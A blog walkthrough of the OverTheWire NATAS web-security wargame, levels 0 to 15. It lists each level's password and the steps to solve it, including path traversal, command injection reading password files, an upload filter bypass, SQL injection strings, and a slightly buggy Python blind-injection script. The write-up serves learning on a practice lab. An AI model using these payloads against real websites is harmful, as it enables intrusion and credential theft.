<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>NATAS Walkthrough | Dharmik Kantesaria</title>
<meta name=keywords content><meta name=description content="A brief guide to solving NATAS Challenges on the OverTheWire platform. "><meta name=author content="Dharmik Kantesaria"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/blogs/natas_0_15/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="http://localhost:1313/blogs/natas_0_15/"><meta property="og:site_name" content="Dharmik Kantesaria"><meta property="og:title" content="NATAS Walkthrough"><meta property="og:description" content="A brief guide to solving NATAS Challenges on the OverTheWire platform. "><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="blogs"><meta property="article:published_time" content="2024-03-24T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-24T00:00:00+00:00"><meta property="og:image" content="http://localhost:1313/%3Cimage%20path/url%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Cimage%20path/url%3E"><meta name=twitter:title content="NATAS Walkthrough"><meta name=twitter:description content="A brief guide to solving NATAS Challenges on the OverTheWire platform. "><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blogs","item":"http://localhost:1313/blogs/"},{"@type":"ListItem","position":2,"name":"NATAS Walkthrough","item":"http://localhost:1313/blogs/natas_0_15/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"NATAS Walkthrough","name":"NATAS Walkthrough","description":"A brief guide to solving NATAS Challenges on the OverTheWire platform. ","keywords":[],"articleBody":"Note: The python script to scrap the password for these challenges. Due to academic policies, it is not available publicly as it writing this script was part of my academics during my masters.\nHave fun learning web-security :)\nNatas answers for levels 1 - 15 Level 0 -\u003e 1 username - natas0\tand password - natas0\nIn level 0, after logging in, right-click on the webpage to view the source code. The password for the next level will be mentioned in a comment in the source code.\nLevel 1 -\u003e 2 username - natas1\tand password - g9D9cREhslqBKtcA2uocGHPfMZVzeFK6\nThis level is similar to the previous level, only that right-click is now blocked. So instead we use the keyboard shortcut (_usually ctrl+shift+c, but could be different in the browser that you are using)\nLevel 2 -\u003e 3 username - natas2 and password - h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7\nWe can view the source code at this level, but there are no comments. We do find another directory referenced in the source code as ","wordCount":"1379","inLanguage":"en","image":"http://localhost:1313/%3Cimage%20path/url%3E","datePublished":"2024-03-24T00:00:00Z","dateModified":"2024-03-24T00:00:00Z","author":{"@type":"Person","name":"Dharmik Kantesaria"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/blogs/natas_0_15/"},"publisher":{"@type":"Organization","name":"Dharmik Kantesaria","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Dharmik Kantesaria (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Dharmik Kantesaria</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/about/ title=About><span>About</span></a></li><li><a href=http://localhost:1313/blogs/ title=Blogs><span>Blogs</span></a></li><li><a href=http://localhost:1313/resume/ title=Resume><span>Resume</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/blogs/>Blogs</a></div><h1 class="post-title entry-hint-parent">NATAS Walkthrough</h1><div class=post-description>A brief guide to solving NATAS Challenges on the OverTheWire platform.</div><div class=post-meta><span title='2024-03-24 00:00:00 +0000 UTC'>March 24, 2024</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1379 words</div></header><div class=post-content><p><em>Note: The python script to scrap the password for these challenges. Due to academic policies, it is not available publicly as it writing this script was part of my academics during my masters.</em></p><p>Have fun learning web-security :)</p><h2 id=natas-answers-for-levels-1---15>Natas answers for levels 1 - 15<a hidden class=anchor aria-hidden=true href=#natas-answers-for-levels-1---15>#</a></h2><h3 id=level-0---1>Level 0 -> 1<a hidden class=anchor aria-hidden=true href=#level-0---1>#</a></h3><blockquote><p>username - <em>natas0</em> and password - <em>natas0</em></p></blockquote><p>In level 0, after logging in, right-click on the webpage to view the source code. The password for the next level will be mentioned in a comment in the source code.</p><h3 id=level-1---2>Level 1 -> 2<a hidden class=anchor aria-hidden=true href=#level-1---2>#</a></h3><blockquote><p>username - <em>natas1</em> and password - <em>g9D9cREhslqBKtcA2uocGHPfMZVzeFK6</em></p></blockquote><p>This level is similar to the previous level, only that right-click is now blocked. So instead we use the keyboard shortcut (_usually <strong>ctrl+shift+c</strong>, but could be different in the browser that you are using)</p><h3 id=level-2---3>Level 2 -> 3<a hidden class=anchor aria-hidden=true href=#level-2---3>#</a></h3><blockquote><p>username - <em>natas2</em> and password - <em>h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7</em></p></blockquote><p>We can view the source code at this level, but there are no comments. We do find another directory referenced in the source code as <code>&lt;img src='files/pixel.png></code> indicating that there is another directory where files exist. So you add the directory <code>/files</code> to the current URL. You should see a list of files in that directory and notice there is another file named <em>users.txt</em>. You should be able to find the password for the next level when reading this file.</p><h3 id=level-3---4>Level 3 -> 4<a hidden class=anchor aria-hidden=true href=#level-3---4>#</a></h3><blockquote><p>username - <em>natas3</em> and password - <em>G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q</em></p></blockquote><p>In the source code of this webpage, we find a comment that says <code>&lt;!-- No more information leaks!! Not even Google will find it this time... --></code> This hints us to look at the <strong><em>robots.txt</em></strong> file. So you add <code>/robots.txt</code> to the URL to view that file. This file tells
search engines which directories they can or cannot crawl on the website. In this file, we find a directory that has not been allowed for crawling by bots, <code>s3cr3ts</code>. Now we replace the <code>/robots.txt</code> with the new found directory, and find the <code>users.txt</code> file, similar to the previous challenge. Here you will find the password for the next level.</p><h3 id=level-4---5>Level 4 -> 5<a hidden class=anchor aria-hidden=true href=#level-4---5>#</a></h3><blockquote><p>username - <em>natas4</em> and password - <em>tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm</em></p></blockquote><p>This level would require you to understand how to use Burpsuite (or another tool to manipulate headers). After logging into the website using the credentials found in the previous challenge, capture the headers that were sent in the GET request. Now, you will need to change the natas level from <code>natas4</code>(the rest of the value is the same) to <code>natas5</code>(the rest of the value is the same as the original). After changing the URL Referrer, send the GET request with the modified headers. You should be able to view the password for next level on the page content that gets returned to the request made.</p><h3 id=level-5---6>Level 5 -> 6<a hidden class=anchor aria-hidden=true href=#level-5---6>#</a></h3><blockquote><p>username - <em>natas5</em> and password - <em>Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD</em></p></blockquote><p>This level is similar to the previous level. The headers must be captured, and the login status must be changed from <code>False</code> to <code>True</code>.</p><h3 id=level-6---7>Level 6 -> 7<a hidden class=anchor aria-hidden=true href=#level-6---7>#</a></h3><blockquote><p>username - <em>natas6</em> and password - <em>fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR</em></p></blockquote><p>This level requires you to do more digging on the website. If you view the source code, there is a hint to the answer in the <code>/includes/secret.inc</code> page that is being referred to match the entered value. When you view that page, it is blank. This will confuse the attacker. However the referred variable in the source code of the main page is from the <code>secrets.inc</code> page, so there must be a variable with the correct value to unlock the password for the next level. If you view the source code of the blank page at <code>/includes/secrets.inc</code> you should find the variable that has the &ldquo;secret&rdquo; value that has been commented.</p><h3 id=level-7---8>Level 7 -> 8<a hidden class=anchor aria-hidden=true href=#level-7---8>#</a></h3><blockquote><p>username - <em>natas7</em> and password - <em>jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr</em></p></blockquote><p>The hint to find the answer that will give us the password is also in the source code. This time, the hint is direct and says that <code>&lt;!-- hint: password for webuser natas8 is in etc/natas_webpass/natas8 --></code>. This means that all we need to do is access this directory on their server to view the password for the next level. If you have used Linux before, then you must be familiar with using the <code>..</code> to change the working directory to the parent directory. If you haven&rsquo;t I would suggest you google about it and learn more, if possible try it out to understand better. There is a web vulnerability called Local File Inclusion, that allows a user to access the local files on a server using the <code>../</code> to go to the parent directory and then enter the directory that we want to view. When you view the &ldquo;home&rdquo; or &ldquo;about&rdquo; page, notice the keyword <code>?page=</code> in the URL. This will query the webserver to view the page mentioned after this keyword. So when we add the string <code>../../../../../../../etc/natas_webpass/natas8</code> after the <code>?page=</code> string in the URL and hit enter, the webpage should show the password for the next level.</p><h3 id=level-8---9>Level 8 -> 9<a hidden class=anchor aria-hidden=true href=#level-8---9>#</a></h3><blockquote><p>username - <em>natas8</em> and password - <em>a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB</em></p></blockquote><p>This time, you see a form field with a submit button. Similar to the previous challenges, we again begin by viewing the source code of the index page. Upon analyzing the source code, we understand that an encrypted key is already written in the source code. The encoded string has been encrypted using the function defined in the source code.
<code>decodedstr = base64.b64decode(bytes.fromhex(encodedstr)[::-1]).decode('utf-8')</code></p><h3 id=level-9---10>Level 9 -> 10<a hidden class=anchor aria-hidden=true href=#level-9---10>#</a></h3><blockquote><p>username - <em>natas9</em> and password - <em>Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd</em></p></blockquote><p>inject the form field with <code>; cat /etc/natas_webpass/natas10*</code></p><h3 id=level-10---11>Level 10 -> 11<a hidden class=anchor aria-hidden=true href=#level-10---11>#</a></h3><blockquote><p>username - <em>natas10</em> and password - <em>D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE</em></p></blockquote><p>inject the form field without &ldquo;;&rdquo;, instead use &ldquo;.&rdquo; (use the same injection string as used for the previous challenge)</p><h3 id=level-11---12>Level 11 -> 12<a hidden class=anchor aria-hidden=true href=#level-11---12>#</a></h3><blockquote><p>username - <em>natas11</em> and password - <em>1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg</em></p></blockquote><p><a href=https://en.wikipedia.org/wiki/XOR_cipher>XOR Cipher</a> -> Encrypted string in the source code which also includes the order of encryption and encoding.</p><h3 id=level-12---13>Level 12 -> 13<a hidden class=anchor aria-hidden=true href=#level-12---13>#</a></h3><blockquote><p>username - <em>natas12</em> and password - <em>YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG</em></p></blockquote><p>upload any file, go to inspect > elements> change the random file name to the format that will unlock the password for the next level (find the required format for filename in the source code).</p><h3 id=level-13---14>Level 13 -> 14<a hidden class=anchor aria-hidden=true href=#level-13---14>#</a></h3><blockquote><p>username - <em>natas13</em> and password - <em>lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9</em></p></blockquote><p>Open the file in a notepad and then add image exif header <code>GIF87a</code> at the beginning and the rest is similar to natas12. You can use any other image exif headers as you just need to validate one of the functions that look for image exif headers on the file uploaded (see it in the source code). Refer to this Wikipedia page for other headers - <a href=https://en.wikipedia.org/wiki/List_of_file_signatures>https://en.wikipedia.org/wiki/List_of_file_signatures</a></p><h3 id=level-14---15>Level 14 -> 15<a hidden class=anchor aria-hidden=true href=#level-14---15>#</a></h3><blockquote><p>username - <em>natas14</em> and password - <em>qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP</em></p></blockquote><p>SQL injection, use any string for the username (which user would exist by default?) and password string as <code>" or "1"="1</code></p><h3 id=level-15---16>Level 15 -> 16<a hidden class=anchor aria-hidden=true href=#level-15---16>#</a></h3><blockquote><p>username - <em>natas15</em> and password - <em>TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB</em></p></blockquote><p>Blind SQL injection, its like trial and error method of performing SQL queries to retrieve the desired data (google to learn more).</p><p>I used python to perform blind SQL Injection for this challenge, you can use any language you are comfortable with.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> re<span style=color:#f92672>,</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://natas15.natas.labs.overthewire.org/index.php&#39;</span>
</span></span><span style=display:flex><span>auth <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#39;natas15&#39;</span>,<span style=color:#e6db74>&#39;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&#39;</span>) <span style=color:#75715e>#auth creds from the previous challenge</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>passwordlist <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>ch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;</span> <span style=color:#75715e>#charset</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#the next 2 lines were written to understand the response of the SQL query performed.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#resp = requests.get(url,auth=auth, params = {&#34;username&#34;:&#34;natas16\&#34; and password like binary \&#34;%&#34;})</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#print(resp.text)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Then the rest of the code was built after understanding the TRUE and the FALSE response we received. </span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>32</span>): <span style=color:#75715e>#we know that the hash is 32 bits long, so we will need to guess 32 characters and hence iterate 32 times.</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> ch: <span style=color:#75715e>#iterate through every character from the charset</span>
</span></span><span style=display:flex><span>        resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url,auth<span style=color:#f92672>=</span>auth, params <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;username&#34;</span>:<span style=color:#e6db74>&#34;natas16</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> and password like binary </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join(passwdlist)<span style=color:#f92672>+</span>j<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;%&#34;</span>}) <span style=color:#75715e>#perform a get request</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;This user exists&#34;</span> <span style=color:#f92672>in</span> resp<span style=color:#f92672>.</span>text: <span style=color:#75715e>#if we get a TRUE response, it means a character matches the original hash. </span>
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;The character no </span><span style=color:#e6db74>{</span>i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span><span style=color:#e6db74>}</span><span style=color:#e6db74> of the password found is : </span><span style=color:#e6db74>{</span>j<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            passwordlist<span style=color:#f92672>.</span>append(j) <span style=color:#75715e>#append the matching character to the hash</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join(passwordlist)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>The password for Natas Level 16 is : </span><span style=color:#e6db74>{</span>password<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><p>Credentials for the next challenge which is level 16 -> 17 are username - <em>natas16</em> and password - <em>TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V</em></p></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Dharmik Kantesaria</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>